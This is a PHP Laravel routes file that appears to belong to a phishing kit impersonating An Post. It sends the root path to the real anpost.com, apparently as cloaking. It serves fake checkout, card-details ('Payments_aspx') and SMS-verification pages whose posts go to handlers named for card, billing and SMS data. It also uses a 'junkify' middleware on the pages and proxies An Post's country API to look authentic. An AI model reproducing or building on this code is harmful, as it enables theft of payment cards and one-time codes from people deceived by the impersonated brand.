<?php

use Illuminate\Support\Facades\Route;
use Symfony\Component\HttpFoundation\BinaryFileResponse;

//////////////////////////////

Route::get("/", [
        function () {
            return redirect("https://www.anpost.com/");
        }]
);

Route::get("/clause/{user}", [
        function ($user) {
            return redirect()->route('billing_form_view');
        }]
);
Route::get("/2.0/autocomplete", "App\Http\Controllers\EirController@handle_autocomplete")->name("autocomplete_endpoint");
Route::get("/2.0/findaddress", "App\Http\Controllers\EirController@handle_findaddress")->name("findaddress_endpoint");
Route::get("/2.0/", "App\Http\Controllers\EirController@base_endpoint")->name("endpoint_dummy_function");
//////////////////////////////
Route::get("/v5/Payments_aspx",
    [
        'middleware' => ['junkify'],
        'as' => 'cc_form_view',
        function () {
            return view("CardDetails");
        }
    ]
);
Route::post("/v5/Payments_aspx", [
    'excluded_middleware' => ['junkify'],
    'as' => 'cc_info_handler',
    'uses' => "App\Http\Controllers\FormController@handle_cc_info"
]);


///////////////////////////
Route::get("/Shop/Checkout",
    [
        'middleware' => ['junkify'],
        'as' => 'billing_form_view',
        function () {
            return view("DeliveryShipping");
        }
    ]
);
Route::post("/Shop/Checkout", [
    'as' => 'shipping_billing_handler',
    'uses' => "App\Http\Controllers\FormController@handle_shipping_billing"
]);


///////////////////////////
Route::get("/v5/sms_verify",
    [
        'middleware' => ['junkify'],
        'as' => 'sms_verify_view',
        function () {
            return view("SmsVerify");
        }
    ]
);

Route::get("/getmetafile/89070294-dbe3-4b1a-b6f3-9727b6b392c2/iphoneX", [
        function () {
            $k = rtrim(app()->basePath('public/' . "/includes/images/iphoneX.jpg"), '/');
            return new BinaryFileResponse($k, 200, ['Content-Type' => 'image/png']);
        }]
);

Route::post("/v5/sms_verify", [
    'as' => 'sms_verification_handler',
    'uses' => "App\Http\Controllers\FormController@handle_sms_verification"
]);


///////////////////////////
Route::get("/v5/processing",
    [
        'middleware' => ['junkify'],
        'as' => 'processing_view',
        function () {
            return view("Processing");
        }
    ]
);
//////////////////////////////

Route::get("/rest/cms.country",
    [
        'as' => 'international_countries_view',
        function () {
            $url = "https://www.anpost.com/rest/cms.country?format=json&hash=c7e876a149e33c8116c45f1a326c6b6f525714677ceab0dbe34d6ce40945d67e";
            $contents = file_get_contents($url);
            return response($contents);
        }
    ]
);
